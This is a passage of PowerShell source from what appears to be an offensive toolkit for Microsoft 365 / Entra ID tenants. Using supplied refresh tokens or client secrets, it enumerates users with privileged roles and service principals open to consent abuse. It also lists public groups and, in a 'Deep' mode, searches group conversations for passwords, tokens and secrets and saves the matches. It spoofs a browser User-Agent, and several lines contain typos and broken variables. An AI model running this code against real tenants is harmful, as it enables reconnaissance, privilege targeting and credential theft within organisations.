        "User-Aget"    = "$UserAgent"
    }

    
    $a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host ""
    Write-Host "==================== Invoke-FindUserRole ====================" -ForegroundColor DarkCyan
    Write-Host "[>>] Starting enumeration of all user accounts and their assigned directory roles in tenant: $TenantName" -ForegroundColor DarkCyan
    Write-Host "[>>] Timestamp: $a" -ForegroundColor DarkCyan
    Write-Host "=============================================================" -ForegroundColor DarkCyan
    Write-Host ""


    $allUsers = @()
    $uri = "https://graph.microsoft.com/v1.0/users"

    while ($uri) {
			if ([Console]::KeyAvailable) {
				$key = [Console]::ReadKey($true)
				if ($key.Key -eq "Enter") {
					Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
					Write-Host "[1] Back To Menu"
					Write-Host "[2] Continue"
					$whatdoyou = Read-Host "Enter your choice"
	
					switch ($whatdoyou) {
						"1" {
							$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
							Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
							Show-MainMenu
							$allUsers = @()
							break
						}
						"2" {
							Write-Host "[+] Continue script..." -ForegroundColor Green
						}
						default {
							Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
						}
					}
				}
			}
        try {
            $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get
            $allUsers += $response.value
            $uri = $response.'@odata.nextLink'
        } catch {
            if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                    if (-not $retryAfter) { $retryAfter = 10 }
                    Write-Host "[X] 429 Too Many Requests. Retrying in $retryAfter seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds $retryAfter
            }
            if ((Get-Date) -gt $StartTime.AddMinutes(7)) {
                Write-Host "[...] Refreshing Access Token" -ForegroundColor DarkYellow
                if ($authMethod -eq "client") {
                    $GraphAccessToken = Get-TokenWithClientSecret -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                }
                if ($authMethod -eq "refresh") {
                    $GraphAccessToken = Get-TokenWithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
                }
                
                $StartTime = Get-Date
                $headers = @{
                    "Authorization" = "Bearer $GraphAccessToken"
                    "Content-Type"  = "application/json"
                    "User-Agent"    = "$UserAgent"
                }
            }
            
        }
    }
	Write-Host "[#] Total users found: $($allUsers.Count)" -ForegroundColor DarkCyan

	$usersWithRoles = @()
    foreach ($user in $allUsers) {
        $id = $user.id
        $upn = $user.userPrincipalName
        Write-Host "`n[>>] Checking roles for: $upn ($id)" -ForegroundColor DarkCyan

        $roleUri = "https://graph.microsoft.com/v1.0/users/$id/transitiveMemberOf/microsoft.graph.directoryRole"

        while ($true) {
            try {
                $roleResponse = Invoke-RestMethod -Uri $roleUri -Headers $headers -Method Get
                $roles = $roleResponse.value
                if ($roles.Count -eq 0) {
                    break
                }
                Write-Host "[+] $upn ($id) has the following roles:" -ForegroundColor DarkGreen
                $roleNames = @()
                foreach ($role in $roles) {
                    $roleNames += $role.displayName
                    Write-Host "    -> $($role.displayName)" -ForegroundColor DarkYellow
                }
                    
                $usersWithRoles += [PSCustomObject]@{
                    UPN       = $upn
                    ObjectId  = $id
                    Roles     = ($roleNames -join ", ")
                }
                    break
            } catch {
                if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                    if (-not $retryAfter) { $retryAfter = 10 }
                    Write-Host "[!] 429 Too Many Requests. Retrying in $retryAfter seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds $retryAfter
                } else {
                    Write-Host "[-] Failed to fetch roles for $upn ($id): $_" -ForegroundColor Red
                    break
                }
            }
        }
    }

    if ($usersWithRoles.Count -gt 0) {
        #Write-Host "`n==========================" -ForegroundColor DarkGreen
        #Write-Host "Users with Roles Found:" -ForegroundColor DarkGreen
        #Write-Host "==========================" -ForegroundColor DarkGreen
        foreach ($user in $usersWithRoles) {
            $add =  "UPN: $($user.UPN)" 
            $add2 =  "ObjectId: $($user.ObjectId)" 
            $add3 =  "Roles: $($user.Roles)" 
            #Write-Host "$add" -ForegroundColor DarkYellow
            #Write-Host "$add2" -ForegroundColor DarkYellow
            #Write-Host "$add3" -ForegroundColor DarkYellow
            Write-Log -Message "$add"
            Write-Log -Message "$add2"
            Write-Log -Message "$add3"

        }
    } else {
        Write-Host "`n[!] No users with roles found." -ForegroundColor DarkGray
    }

    $b = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "Exported to C:\Users\Public\UserAccountsWithRoles.txt" -ForegroundColor DarkCyan
    Write-Host "[>>] Timestamp: $b" -ForegroundColor DarkCyan
}



<#################################################################################################################################################>
function Invoke-FindServicePrincipal {
    param (
        [string]$RefreshToken,
        [string]$GraphAccessToken,
        [string]$TenantName,
        [string]$ClientID,
        [string]$ClientSecret,
	    [string]$TenantID
    )

    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $headers = @{ 'User-Agent' = $UserAgent }

	$OutputFile = "C:\Users\Public\FindServicePrincipal.txt"
	if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }

    function Get-TokenWithRefreshToken {
        param ( 
            [string]$TenantID
        )
        
        $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" 
        $body = @{
            client_id     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            scope         = "https://graph.microsoft.com/.default"
            grant_type    = "refresh_token"
            refresh_token = $RefreshToken
        }

        try {
            $response = Invoke-RestMethod -Method Post -Uri $url -Body $body -Headers $headers -ContentType "application/x-www-form-urlencoded"
            return $response.access_token
        } catch {
            Write-Host "[-] Failed to get access token: $_" -ForegroundColor Red
            exit 1
        }
    }

	function Get-TokenWithClientSecret {
        param(
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$TenantID   
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
		$body = @{
			"client_id"     = $ClientId
			"client_secret" = $ClientSecret
			"scope"         = "https://graph.microsoft.com/.default"
			"grant_type"    = "client_credentials"
			}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
	}


	if (-not $GraphAccessToken) { return }

    if($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null){
        $authMethod = "client"
    }
    
    if( $RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null){
        $authMethod = "refresh"
    }

    $StartTime = Get-Date
    $headers = @{
        "Authorization" = "Bearer $GraphAccessToken"
        "Content-Type"  = "application/json"
        "User-Aagent"    = "$UserAgent"
    }


    $a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host ""
    Write-Host "==================== Invoke-FindServicePrincipal ====================" -ForegroundColor DarkCyan
    Write-Host "[>>] Starting enumeration of all Service Delegated Service Principal in tenant: $TenantName" -ForegroundColor DarkCyan
    Write-Host "[>>] Timestamp: $a" -ForegroundColor DarkCyan
    Write-Host "=============================================================" -ForegroundColor DarkCyan
    Write-Host ""


    $allServicePrincipalIds = @()
    $uri = "https://graph.microsoft.com/v1.0/servicePrincipals"
     Write-Host "[*] Satring to enumerate all Service Principal in $TenantName Tenant" -ForegroundColor Cyan

    do {
		if ([Console]::KeyAvailable) {
			$key = [Console]::ReadKey($true)
			if ($key.Key -eq "Enter") {
				Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
				Write-Host "[1] Back To Menu"
				Write-Host "[2] Continue"
				$whatdoyou = Read-Host "Enter your choice"
				
				switch ($whatdoyou) {
					"1" {
						$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
						Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
						$allServicePrincipalIds = @()
						Show-MainMenu
						break
					}
					"2" {
						Write-Host "[+] Continue script..." -ForegroundColor Green
					}
					default {
						Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
					}
				}
			}
		}
        try {
            $response = Invoke-RestMethod -Method GET -Uri $uri -Headers $headers -ErrorAction Stop
            $allServicePrincipalIds += $response.value | ForEach-Object { $_.id }
            $uri = $response.'@odata.nextLink'
        } catch {
				if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                    if (-not $retryAfter) { $retryAfter = 10 }
                    Write-Host "[X] 429 received. Waiting $retryAfter seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds $retryAfter
				}
				else{
					Write-Host "[-] Failed to Service Principals" -ForegroundColor Red
					break
				}
			}
    } while ($uri)
        Write-Host "[+] Retrieved $($allServicePrincipalIds.Count) Service Principal IDs." -ForegroundColor DarkGreen
        $output = @()
        foreach ($id in $allServicePrincipalIds) {
			if ([Console]::KeyAvailable) {
				$key = [Console]::ReadKey($true)
				if ($key.Key -eq "Enter") {
					Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
					Write-Host "[1] Back To Menu"
					Write-Host "[2] Continue"
					$whatdoyou = Read-Host "Enter your choice"
					
					switch ($whatdoyou) {
						"1" {
							$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
							Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
							$allServicePrincipalIds = @()
							Show-MainMenu
							break
						}
						"2" {
							Write-Host "[+] Continue script..." -ForegroundColor Green
						}
						default {
							Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
						}
					}
				}
			}
        if ((Get-Date) -gt $StartTime.AddMinutes(7)) {
            Write-Host "[...] Refreshing Access Token" -ForegroundColor YDarkellow
                if ($authMethod -eq "client") {
                    $GraphAccessToke = Get-TokenWithClientSecret -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                }
                if ($authMethod -eq "refresh") {
                    $GraphAccessToken = Get-TokenWithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
                }
                
                $StartTime = Get-Date
                $headers = @{
                    "Authorization" = "Bearer $GraphAccessToken"
                    "Content-Type"  = "application/json"
                    "User-Agent"    = "$UserAgent"
                }
            }

        $spUri = "https://graph.microsoft.com/v1.0/servicePrincipals/$id"
        $grantsUri = "https://graph.microsoft.com/v1.0/servicePrincipals/$id/oauth2PermissionGrants"

        $response = $null
        $grants = $null

        while ($true) {
		if ([Console]::KeyAvailable) {
			$key = [Console]::ReadKey($true)
			if ($key.Key -eq "Enter") {
				Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
				Write-Host "[1] Back To Menu"
				Write-Host "[2] Continue"
				$whatdoyou = Read-Host "Enter your choice"
				
				switch ($whatdoyou) {
					"1" {
						$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
						Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
						$allServicePrincipalIds = @()
						$response = $null
						$grants = $null
						Show-MainMenu
						break
					}
					"2" {
						Write-Host "[+] Continue script..." -ForegroundColor Green
					}
					default {
						Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
					}
				}
			}
		}
            try {
                $response = Invoke-RestMethod -Uri $spUri -Headers $headers -Method GET -ErrorAction Stop
                $grants = Invoke-RestMethod -Uri $grantsUri -Headers $headers -Method GET -ErrorAction SilentlyContinue
                break
            } catch {
                if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                    if (-not $retryAfter) { $retryAfter = 10 }
                    Write-Host "[X] 429 received. Waiting $retryAfter seconds" -ForegroundColor DarkYellow
                    Start-Sleep -Seconds $retryAfter
                } else {
                    Write-Host "[-] Failed to fetch SP $id" -ForegroundColor Red
                    break
                }
            }
        }

        if ($response) {
            $clientId = $response.appId
            $displayName = $response.displayName
            $scopes = $response.oauth2PermissionScopes
            $ReplyUrls = $response.replyUrls
            $delegatedScopes = $scopes | Where-Object { $_.type -eq "User" }

            $hasNoSecret = -not $response.passwordCredentials -or $response.passwordCredentials.Count -eq 0
            $hasDelegatedScopes = $delegatedScopes.Count -gt 0
            $hasAdminConsent = $false
            if ($grants.value | Where-Object { $_.consentType -eq "AllPrincipals" }) {
                $hasAdminConsent = $true
            }

            if ($hasDelegatedScopes -and $hasNoSecret -and -not $hasAdminConsent) {
                foreach ($scope in $delegatedScopes) {
                    $line1 = "[+] $displayName | client_id: $clientId | scope: $($scope.value) | consent: $($scope.adminConsentDescription)"
                    Write-Host $line1 -ForegroundColor Green
                    Write-Host "[Reply URLs]:" -ForegroundColor DarkCyan
                    foreach ($url in $response.replyUrls) {
                        Write-Host "  - $url" -ForegroundColor DarkGreen
                    }
                    Write-Host "================="
                    $output += $line1
                    $output += $response.replyUrls | ForEach-Object { "  - $_" }
                    $output += "================="
                }
            } else {
                $line = "[-] $displayName | client_id: $clientId | Skipped (admin consent granted or not eligible)"
                Write-Host $line -ForegroundColor DarkGray
            }
        }
    }
    $output | Out-File -FilePath "C:\Users\Public\FindServicePrincipal.txt" -Encoding UTF8
    $b = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "Exported to C:\Users\Public\FindServicePrincipal.txt" -ForegroundColor DarkCyan
    Write-Host "[>>] Timestamp: $b" -ForegroundColor DarkCyan

}

<#################################################################################################################################################>
function Invoke-FindPublicGroups {

    param (
        [string]$RefreshToken, 
        [string]$ClientID, 
        [string]$GraphAccessToken, 
        [string]$TenantID,
        [string]$TenantName,
        [string]$ClientSecret,
        [switch]$Deep		
    )


    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $headers = @{ 'User-Agent' = $UserAgent }
	
	
    function Get-Token-WithRefreshToken {
        param( 
            [string]$RefreshToken, 
            [string]$TenantID 
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
	    $body = @{
            "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "scope"         = "https://graph.microsoft.com/.default"
            "grant_type"    = "refresh_token"
            "refresh_token" = $RefreshToken
		}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
	}

	function Get-Token-WithClientSecret {
        param(
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$TenantID   
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
		$body = @{
			"client_id"     = $ClientId
			"client_secret" = $ClientSecret
			"scope"         = "https://graph.microsoft.com/.default"
			"grant_type"    = "client_credentials"
			}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
		}


	if (-not $GraphAccessToken) { return }

    if($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null){
        $authMethod = "client"
    }
    
    if( $RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null){
        $authMethod = "refresh"
    }

    if (Test-Path "C:\Users\Public\Public_Groups.txt") {
        $choice = Read-Host "C:\Users\Public\Public_Groups.txt exists. (D)elete / (A)ppend?"
        if ($choice -match "^[dD]$") {
            Remove-Item -Path "C:\Users\Public\Public_Groups.txt" -Force
        } elseif ($choice -notmatch "^[aA]$") {
            return
        }
    }

    function Invoke-With-Retry {
        param (
            [string]$Url
        )
        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $headers = @{ 
            'User-Agent' = $UserAgent
            'Authorization' = "Bearer $GraphAccessToken"
            }
        $success = $false
        $response = $null
            do {
				if ([Console]::KeyAvailable) {
					$key = [Console]::ReadKey($true)
					if ($key.Key -eq "Enter") {
						Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
						Write-Host "[1] Back To Menu"
						Write-Host "[2] Continue"
						$whatdoyou = Read-Host "Enter your choice"
				
						switch ($whatdoyou) {
							"1" {
								$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
								Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
								$success = $false
								$response = $null
								Show-MainMenu
								break
							}
							"2" {
								Write-Host "[+] Continue script..." -ForegroundColor Green
							}
							default {
								Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
							}
						}
					}
				}
                try {
                    $response = Invoke-RestMethod -Uri $Url -Headers $headers -ErrorAction Stop
                    $success = $true
                } catch {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    if ($statusCode -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 7 }
                        Write-Host "[!] Rate limit hit ($Url). Sleeping $retryAfter seconds..." -ForegroundColor Yellow
                        Start-Sleep -Seconds ([int]$retryAfter)
                    } else {
                        Write-Host "[-] Error in request to $Url" -ForegroundColor DarkGray
                        return $null
                    }
                }
            } while (-not $success)
            return $response
        }

	
    function Get-SensitiveConversations {
        param (
            [string]$GroupId,
            [string]$GroupName,
            [string]$AccessToken
        )

        if (-not (Test-Path "Conversations")) {
            New-Item -ItemType Directory -Path "Conversations" | Out-Null
        }

        $headers = @{ 
            'Authorization' = "Bearer $AccessToken" 
            'user-agent'    = "$UserAgent"
        }
        
        $keywords = @("admin", "accesstoken", "refreshtoken", "token", "password", "secret")

        function Invoke-With-Retry {
            param (
                [string]$Url
            )
            
            $success = $false
            $response = $null
            do {
				if ([Console]::KeyAvailable) {
					$key = [Console]::ReadKey($true)
					if ($key.Key -eq "Enter") {
						Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
						Write-Host "[1] Back To Menu"
						Write-Host "[2] Continue"
						$whatdoyou = Read-Host "Enter your choice"
				
						switch ($whatdoyou) {
							"1" {
								$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
								Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
								$success = $false
								$response = $null
								Show-MainMenu
								break
							}
							"2" {
								Write-Host "[+] Continue script..." -ForegroundColor Green
							}
							default {
								Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
							}
						}
					}
				}
                try {
                    $response = Invoke-RestMethod -Uri $Url -Headers $headers -ErrorAction Stop
                    $success = $true
                } 
                catch {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    if ($statusCode -eq 429) {
                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                    if (-not $retryAfter) { $retryAfter = 7 }
                    Write-Host "[!] Rate limit hit ($Url). Sleeping $retryAfter seconds..." -ForegroundColor Yellow
                    Start-Sleep -Seconds ([int]$retryAfter)
                    } 
                    else {
                        Write-Host "[-] Error in request to $Url" -ForegroundColor DarkGray
                        return $null
                    }
                }
                } while (-not $success)
                    return $response
        }

        $convos = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/groups/$GroupId/conversations"
        if (-not $convos) { return }
        foreach ($convo in $convos.value) {
            $threads = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/groups/$GroupId/conversations/$($convo.id)/threads"
            if (-not $threads) { continue }
            foreach ($thread in $threads.value) {
                $posts = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/groups/$GroupId/conversations/$($convo.id)/threads/$($thread.id)/posts"
                if (-not $posts) { continue }
                foreach ($post in $posts.value) {
                    $rawHtml = $post.body.content
                    $rawName = "$GroupId-$($convo.id)-$($thread.id)"
                    $cleanName = ($rawName -replace '[^\w\-]', '') 
                    if ($cleanName.Length -gt 100) {
                        $cleanName = $cleanName.Substring(0, 100)
                    }
                    $fileName = "$cleanName.html"
                    $filePath = Join-Path -Path "Conversations" -ChildPath $fileName

                    Add-Type -AssemblyName System.Web
                    $decoded = [System.Web.HttpUtility]::HtmlDecode($rawHtml)
                    $plainText = ($decoded -replace '<[^>]+>', '') -replace '\s{2,}', ' '

                    foreach ($kw in $keywords) {
                        if ($plainText -match "(?i)\b$kw\b.{0,200}") {
                            $matchLine = $matches[0]
                            Write-Host "[!!!] Suspicious content found in group '$GroupName': $kw" -ForegroundColor Red
                            Write-Host "`t--> $matchLine" -ForegroundColor Gray
                            Add-Content -Path "Public_Groups.txt" -Value "[DEAP] $GroupName ($GroupId) | keyword: $kw"
                            Add-Content -Path "Public_Groups.txt" -Value "`t--> $matchLine"
                            Add-Content -Path "Public_Groups.txt" -Value "`t--> Saved full HTML: Conversations\$fileName"
                            break
                        }
                    }
                }
            }
        }
    }
	
	function Get-GroupsWithDirectoryRoles {
        param ($AccessToken)

        $headers = @{ Authorization = "Bearer $AccessToken" }
        $roles = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/directoryRoles" -Headers $headers

        $GroupIdsWithRoles = @{}
        $ProcessedRoleIds = @{}

        foreach ($role in $roles.value) {
            $roleId = $role.id
            if ($ProcessedRoleIds.ContainsKey($roleId)) { continue }

            $memberUrl = "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members"
            $members = Invoke-With-Retry -Url $memberUrl -Headers $headers
            Start-Sleep -Milliseconds 300

            foreach ($member in $members.value) {
                if ($member.'@odata.type' -eq "#microsoft.graph.group") {
                        $GroupIdsWithRoles[$member.id] = $role.displayName
                }
            }

            $ProcessedRoleIds[$roleId] = $true
        }

        return $GroupIdsWithRoles
    }

    $headers = @{
        "Authorization"    = "Bearer $GraphAccessToken"
        "Content-Type"     = "application/json"
        "ConsistencyLevel" = "eventual"
        "Prefer"           = "odata.maxpagesize=999"
        "user-agent"    = "$UserAgent"
    }
        
    $startTime = Get-Date
    $refreshIntervalMinutes = 7
    $groupApiUrl = "https://graph.microsoft.com/v1.0/groups?$filter=groupTypes/any(c:c eq 'Unified')&$select=id,displayName,visibility&$top=999"

    $totalGroupsScanned = 0

    $a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host ""
    Write-Host "==================== Invoke-FindPublicGroups ====================" -ForegroundColor DarkCyan
    Write-Host "[>>] Initiating enumeration of Microsoft 365 groups to identify publicly accessible groups in tenant: $TenantName" -ForegroundColor DarkCyan
    Write-Host "[>>] Execution Timestamp: $a" -ForegroundColor DarkCyan
    Write-Host "=================================================================" -ForegroundColor DarkCyan
    Write-Host ""

        $GroupIdToRoleMap = @{}
        $success1 = $false
            do {
                try {
                    Write-Host "[>>] Fetching directory role assignments" -ForegroundColor DarkYellow
                    $GroupIdToRoleMap = Get-GroupsWithDirectoryRoles -AccessToken $GraphAccessToken
                    $success1 = $true
					if ([Console]::KeyAvailable) {
					$key = [Console]::ReadKey($true)
					if ($key.Key -eq "Enter") {
						Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
						Write-Host "[1] Back To Menu"
						Write-Host "[2] Continue"
						$whatdoyou = Read-Host "Enter your choice"
		
						switch ($whatdoyou) {
							"1" {
								$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
								Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
								$success1 = $false
								Show-MainMenu
								break
							}
							"2" {
								Write-Host "[+] Continue script..." -ForegroundColor Green
							}
							default {
								Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
							}
						}
					}
				}
                } catch {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    if ($statusCode -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 7 }
                        Write-Host "[X] Rate limit hit during role mapping. Sleeping for $retryAfter seconds..." -ForegroundColor DarkYellow
                        Start-Sleep -Seconds ([int]$retryAfter)
                    } elseif ($statusCode -eq 401) {
                        Write-Host "[...] refreshing token" -ForegroundColor DarkYellow
                        if ($authMethod -eq "refresh") {
                            $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
                        } elseif ($authMethod -eq "client") {
                            $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
                        }
                        if (-not $GraphAccessToken) { return }
                        $headers["Authorization"] = "Bearer $GraphAccessToken"
                    } else {
                        Write-Host "[-] Unhandled error during role mapping. Exiting." -ForegroundColor DarkRed
                        return
                    }
                }
            } while (-not $success1)
	
            do {
                $success = $false
                do {
                    try {
                        $response = Invoke-RestMethod -Uri $groupApiUrl -Headers $headers -Method Get -ErrorAction Stop
                        $success = $true
						if ([Console]::KeyAvailable) {
						$key = [Console]::ReadKey($true)
						if ($key.Key -eq "Enter") {
							Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
							Write-Host "[1] Back To Menu"
							Write-Host "[2] Continue"
							$whatdoyou = Read-Host "Enter your choice"
			
							switch ($whatdoyou) {
								"1" {
									$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
									Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
									$success1 = $false
									Show-MainMenu
									break
								}
								"2" {
									Write-Host "[+] Continue script..." -ForegroundColor Green
								}
								default {
									Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
								}
							}
						}
					}
                    } catch {
                        $statusCode = $_.Exception.Response.StatusCode.value__
                        if ($statusCode -eq 429) {
                            $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                            if (-not $retryAfter) { $retryAfter = 7 }
                            Write-Host "[X] Rate limit hit. Sleeping for $retryAfter seconds..." -ForegroundColor DarkYellow
                            Start-Sleep -Seconds ([int]$retryAfter)
                        } elseif ($statusCode -eq 401) {
                            Write-Host "[...] refreshing Access Token" -ForegroundColor DarkYellow
                            if ($authMethod -eq "refresh") {
                                $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
                            } elseif ($authMethod -eq "client") {
                                $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
                            }
                            if (-not $GraphAccessToken) { return }
                                $headers["Authorization"] = "Bearer $GraphAccessToken"
                                $startTime = Get-Date
                        } else {
                            Write-Host "[-] Unexpected error. Exiting." -ForegroundColor DarkRed
                            return
                         }
                    }
                } while (-not $success)

        $groupsBatch = $response.value
        $batchCount = $groupsBatch.Count
        $scannedInBatch = 0


        foreach ($group in $groupsBatch) {
			
			if ([Console]::KeyAvailable) {
				$key = [Console]::ReadKey($true)
				if ($key.Key -eq "Enter") {
					Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
					Write-Host "[1] Back To Menu"
					Write-Host "[2] Continue"
					$whatdoyou = Read-Host "Enter your choice"
		
					switch ($whatdoyou) {
						"1" {
							$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
							Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
							$success1 = $false
							Show-MainMenu
							break
						}
						"2" {
							Write-Host "[+] Continue script..." -ForegroundColor Green
						}
						default {
							Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
						}
					}
				}
			}
            $groupId = $group.id
            $groupName = $group.displayName
            $visibility = $group.visibility
			
			if ($visibility -eq "Public") {
                if ($GroupIdToRoleMap.ContainsKey($groupId)) {
                    Write-Host "[!!!] $groupName ($groupId) is Public AND has Directory Role: $($GroupIdToRoleMap[$groupId])" -ForegroundColor DarkGreen
                    "[Privileged] $($groupName.PadRight(30)) : $($groupId.PadRight(40)) : Role = $($GroupIdToRoleMap[$groupId])" | Add-Content -Path "Public_Groups.txt"
                } else {
                    Write-Host "[+] $groupName ($groupId) is Public" -ForegroundColor DarkGreen
                    "$($groupName.PadRight(30)) : $($groupId.PadRight(40))" | Add-Content -Path "C:\Users\Public\Public_Groups.txt"
                }
				if ($Deep) {
					Get-SensitiveConversations -GroupId $groupId -GroupName $groupName -AccessToken $GraphAccessToken
				}
            }

            $scannedInBatch++
            $totalGroupsScanned++
            $percent = [math]::Round(($scannedInBatch / $batchCount) * 100)
            Write-Progress -Activity "Scanning Public Groups..." -Status "$percent% Complete in current batch" -PercentComplete $percent
        }


        if ((New-TimeSpan -Start $startTime).TotalMinutes -ge $refreshIntervalMinutes) {
            Write-Host "[...] refreshing Access Token" -ForegroundColor DarkYellow
            if ($authMethod -eq "refresh") {
                $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
            } elseif ($authMethod -eq "client") {
                $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
            }
            if (-not $GraphAccessToken) { return }
            $headers["Authorization"] = "Bearer $GraphAccessToken"
            $startTime = Get-Date
        }
		
        $groupApiUrl = $response.'@odata.nextLink'

    } while ($groupApiUrl)

    Write-Host "`[>] Finished scanning. Total Groups Scanned: $totalGroupsScanned" -ForegroundColor DarkCyan
    $b = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "Exported to C:\Users\Public\Public_Groups.txt" -ForegroundColor DarkCyan
    Write-Host "[>>] Timestamp: $b" -ForegroundColor DarkCyan
}

<#################################################################################################################################################>
function Invoke-FindDynamicGroups {	
    param (
        [string]$RefreshToken, 
        [string]$ClientID, 
        [string]$GraphAccessToken, 
        [string]$TenantID,
        [string]$TenantName,
        [string]$ClientSecret
    )
    
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $headers = @{ 'User-Agent' = $UserAgent }
		
    function Get-Token-WithRefreshToken {
        param( 
            [string]$RefreshToken, 
            [string]$TenantID 
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
	    $body = @{
            "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "scope"         = "https://graph.microsoft.com/.default"
            "grant_type"    = "refresh_token"
            "refresh_token" = $RefreshToken
		}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
	}
